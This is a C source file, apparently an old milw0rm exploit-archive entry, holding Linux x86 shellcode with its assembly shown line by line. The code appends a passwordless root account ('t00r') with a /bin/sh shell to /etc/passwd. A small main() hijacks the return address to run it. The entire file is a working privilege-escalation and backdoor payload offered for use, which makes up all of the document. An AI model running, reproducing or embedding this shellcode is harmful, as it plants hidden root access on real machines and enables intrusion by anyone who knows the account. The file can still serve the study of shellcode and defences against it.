/*
 * s0t4ipv6@shellcode.com.ar
 * 0x14abril0x7d2
 *
 * 82 bytes
 * Agrega la linea "t00r::0:0::/:/bin/sh" en /etc/passwd
 *
 * Encriptada en http://www.shellcode.com.ar/linux/lnx-t00r-cr1.c
 *
*/

#include <stdio.h>

// Shellcode			// Asm Code
char shellcode[]=
"\x31\xc0"                      // xorl         %eax,%eax
"\x50"                          // pushl        %eax
"\x68\x73\x73\x77\x64"          // pushl        $0x64777373
"\x68\x63\x2f\x70\x61"          // pushl        $0x61702f63
"\x68\x2f\x2f\x65\x74"          // pushl        $0x74652f2f
"\x89\xe3"                      // movl         %esp,%ebx
"\x8d\x48\x02"                  // leal         0x2(%eax),%ecx
"\x8d\x40\x05"                  // leal         0x5(%eax),%eax
"\xcd\x80"                      // int          $0x80
"\x89\xc3"                      // movl         %eax,%ebx
"\x87\xca"                      // xchgl        %ecx,%edx
"\x31\xc9"                      // xorl         %ecx,%ecx
"\xb0\x13"                      // movb         $0x13,%al
"\xcd\x80"                      // int          $0x80
"\x51"                          // pushl        %ecx
"\x68\x6e\x2f\x73\x68"          // pushl        $0x68732f6e
"\x68\x3a\x2f\x62\x69"          // pushl        $0x69622f3a
"\x68\x30\x3a\x3a\x2f"          // pushl        $0x2f3a3a30
"\x68\x3a\x3a\x30\x3a"          // pushl        $0x3a303a3a
"\x68\x74\x30\x30\x72"          // pushl        $0x72303074
"\x8d\x41\x04"                  // leal         0x4(%ecx),%eax
"\x89\xe1"                      // movl         %esp,%ecx
"\xb2\x14"                      // movb         $0x14,%dl
"\xcd\x80"                      // int          $0x80
"\x31\xc0"                      // xorl         %eax,%eax
"\xb0\x06"                      // movb         $0x6,%al
"\xcd\x80"                      // int          $0x80
"\x40"                          // incl         %eax
"\xcd\x80";                     // int          $0x80

main() {
	int *ret;
	ret=(int *)&ret+2;
	printf("Shellcode lenght=%d\n",strlen(shellcode));
	(*ret) = (int)shellcode;
}

// milw0rm.com [2004-09-12]